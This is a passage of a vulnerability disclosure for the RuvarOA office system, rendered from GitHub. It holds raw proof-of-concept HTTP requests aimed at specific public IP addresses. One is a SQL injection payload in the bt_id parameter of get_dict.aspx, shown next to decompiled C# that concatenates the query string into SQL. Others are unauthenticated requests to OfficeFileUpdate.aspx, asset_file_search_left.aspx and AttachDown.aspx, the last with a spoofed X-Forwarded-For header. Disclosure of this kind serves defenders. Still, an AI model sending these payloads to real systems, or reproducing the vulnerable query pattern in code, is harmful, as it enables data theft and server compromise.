<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">get_dict.aspx</h3><a id="user-content-get_dictaspx" class="anchor" aria-label="Permalink: get_dict.aspx" href="#get_dictaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-25" class="anchor" aria-label="Permalink: path" href="#path-25"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">include/get_dict.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-25" class="anchor" aria-label="Permalink: POC" href="#poc-25"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /include/get_dict.aspx?bi_value=1&amp;bt_id=1%29+AND+1248+IN+%28SELECT+@@version%29+AND+%282558%3D2558&amp;bt_name=1&amp;bi_name=1 HTTP/1.1
Host: 183.6.103.52:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302589405-73da6660-bb47-4069-8f59-40117305b17a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODk0MDUtNzNkYTY2NjAtYmI0Ny00MDY5LThmNTktNDAxMTczMDViMTdhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTk2YTg2MmQwMTFmY2U4MmZlMGIyOTNhYzg5MjdmMDFjY2IyZjYzY2Y5ODQwMzQ3YWYzMGM0MDlhMTM0NTUwOTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.a21BIWxtdTuNwHgyBJY1Pi16rOnElw9Tmy5Zg9EVX0I"><img width="1590" alt="image-20240128004110975" src="https://private-user-images.githubusercontent.com/18260135/302589405-73da6660-bb47-4069-8f59-40117305b17a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODk0MDUtNzNkYTY2NjAtYmI0Ny00MDY5LThmNTktNDAxMTczMDViMTdhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTk2YTg2MmQwMTFmY2U4MmZlMGIyOTNhYzg5MjdmMDFjY2IyZjYzY2Y5ODQwMzQ3YWYzMGM0MDlhMTM0NTUwOTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.a21BIWxtdTuNwHgyBJY1Pi16rOnElw9Tmy5Zg9EVX0I" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-25" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-25"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function get_dict within the DLL file /RuvarOA/bin/include.dll</p>
<pre><code>public class get_dict : Page
{
    protected HtmlForm form1;

    protected GridView dataGrid;

    protected Literal lt_bt_id;

    protected Literal lt_bi_name;

    protected Literal lt_bi_id;

    protected void Page_Load(object sender, EventArgs e)
    {
        lt_bt_id.Text = ((Page)this).Request.QueryString["bt_id"];
        string text = ((Page)this).Request.QueryString["bt_name"];
        lt_bi_id.Text = ((Page)this).Request.QueryString["bi_id"];
        lt_bi_name.Text = ((Page)this).Request.QueryString["bi_name"];
        string text2 = "";
        text2 = ((!Validate.isNullOrSpace(lt_bt_id.Text)) ? ("select sys_baseinfo.sys_baseinfo_id,sys_baseinfo.bi_name,sys_baseinfo_type.bt_name,sys_baseinfo.sys_basetype_id  from sys_baseinfo inner join sys_baseinfo_type on  sys_baseinfo.sys_basetype_id=sys_baseinfo_type.sys_basetype_id where  sys_baseinfo.sys_basetype_id in (" + lt_bt_id.Text + ") order by bi_order asc ") : ("select sys_baseinfo.sys_baseinfo_id,sys_baseinfo.bi_name,sys_baseinfo_type.bt_name,sys_baseinfo.sys_basetype_id  from sys_baseinfo inner join sys_baseinfo_type on  sys_baseinfo.sys_basetype_id=sys_baseinfo_type.sys_basetype_id where  bt_name='" + Common.FixQuote(text) + "' order by bi_order asc "));
        DataView dataView = SqlHelper.QueryView(text2);
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["bt_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Information Leakage and Unauthorized Access to Sensitive Data</h2><a id="user-content-information-leakage-and-unauthorized-access-to-sensitive-data" class="anchor" aria-label="Permalink: Information Leakage and Unauthorized Access to Sensitive Data" href="#information-leakage-and-unauthorized-access-to-sensitive-data"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">Error messages that reveal the physical path of the website can be a security risk, especially if there are other vulnerabilities present, such as SQL injection. If an attacker can exploit an SQL injection vulnerability to write files to the server, they might be able to "get shell" access, which means gaining unauthorized access to the server's command line interface.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">OfficeFileUpdate.aspx</h3><a id="user-content-officefileupdateaspx" class="anchor" aria-label="Permalink: OfficeFileUpdate.aspx" href="#officefileupdateaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-26" class="anchor" aria-label="Permalink: path" href="#path-26"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WorkFlow/OfficeFileUpdate.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-26" class="anchor" aria-label="Permalink: POC" href="#poc-26"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>POST /WorkFlow/OfficeFileUpdate.aspx HTTP/1.1
Host: 112.74.79.113:8000
Content-Length: 144
Cache-Control: max-age=0
Origin: http://112.74.79.113:8000
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://112.74.79.113:8000/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Connection: close

__VIEWSTATE=%2FwEPDwUKLTUwNDQwMTA1MGRkLNtCIVKbdmdjLp4E6Em829B9XPLlIL9eHNh9igI5cNQ%3D&amp;Button1=%E5%BC%80%E5%A7%8B%E6%9B%B4%E6%96%B0&amp;txt_file_name=
</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302593286-f8062480-6310-4a05-9b62-99e7a1bb31bd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTMyODYtZjgwNjI0ODAtNjMxMC00YTA1LTliNjItOTllN2ExYmIzMWJkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWFhMzY3MTU1YmQxODFkYzM3NWY4MTI2OTBjNWQxNTZhMzA3NWVlMjA4OTg1MDBjMjlhMDdmOWQyMDVlNTA3NTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.o6dq-ZUxKFx-N9bNUcAqLBzv-dF0aXdiBJEwcp1FDo0"><img width="1520" alt="image-20240127215531511" src="https://private-user-images.githubusercontent.com/18260135/302593286-f8062480-6310-4a05-9b62-99e7a1bb31bd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTMyODYtZjgwNjI0ODAtNjMxMC00YTA1LTliNjItOTllN2ExYmIzMWJkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWFhMzY3MTU1YmQxODFkYzM3NWY4MTI2OTBjNWQxNTZhMzA3NWVlMjA4OTg1MDBjMjlhMDdmOWQyMDVlNTA3NTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.o6dq-ZUxKFx-N9bNUcAqLBzv-dF0aXdiBJEwcp1FDo0" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">asset_file_search_left.aspx</h3><a id="user-content-asset_file_search_leftaspx" class="anchor" aria-label="Permalink: asset_file_search_left.aspx" href="#asset_file_search_leftaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-27" class="anchor" aria-label="Permalink: path" href="#path-27"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">asset/asset_file_search_left.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-27" class="anchor" aria-label="Permalink: POC" href="#poc-27"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /asset/asset_file_search_left.aspx HTTP/1.1
Host: 112.74.79.113:8000


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302593867-b0e5402b-00ec-447d-91c4-c48a3386a8f9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTM4NjctYjBlNTQwMmItMDBlYy00NDdkLTkxYzQtYzQ4YTMzODZhOGY5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWM2NjkxYTUxOGYxMTlmMzgwYTU2NTM3NzdiNjQ1MWNhZDZkZGY1OTIzMzdhMWFiMjA1MDc1YWIxMTAzZWQ3MzQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.JJywtiwiMEvPPzYrjxb--MZfJc3xRYetoNduKQHu0Lg"><img width="1060" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302593867-b0e5402b-00ec-447d-91c4-c48a3386a8f9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTM4NjctYjBlNTQwMmItMDBlYy00NDdkLTkxYzQtYzQ4YTMzODZhOGY5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWM2NjkxYTUxOGYxMTlmMzgwYTU2NTM3NzdiNjQ1MWNhZDZkZGY1OTIzMzdhMWFiMjA1MDc1YWIxMTAzZWQ3MzQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.JJywtiwiMEvPPzYrjxb--MZfJc3xRYetoNduKQHu0Lg" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">AttachDown.aspx</h3><a id="user-content-attachdownaspx-1" class="anchor" aria-label="Permalink: AttachDown.aspx" href="#attachdownaspx-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-28" class="anchor" aria-label="Permalink: path" href="#path-28"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Mobile/LHMail/AttachDown.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-28" class="anchor" aria-label="Permalink: POC" href="#poc-28"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /Mobile/LHMail/AttachDown.aspx?contentid=1 HTTP/1.1
Host: 112.74.79.113:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
X-Forwarded-For: 127.0.0.1


</code></pre>
